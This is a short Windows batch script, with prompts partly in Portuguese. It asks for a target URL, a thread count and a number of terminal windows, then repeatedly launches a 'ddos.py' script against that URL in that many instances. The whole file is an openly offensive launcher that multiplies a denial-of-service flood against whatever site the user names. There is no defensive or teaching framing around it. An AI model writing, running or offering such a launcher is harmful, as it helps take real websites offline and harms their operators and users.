@echo off

set /p url="URL: "
set /p threads="Threads: "
set /p quantidade="Quantidade de terminais para abrir: "

set loopcount=%quantidade%

:loop
start ddos.py %url% %threads%
set /a loopcount=loopcount-1
if %loopcount%==0 goto exitloop
goto loop
:exitloop
pause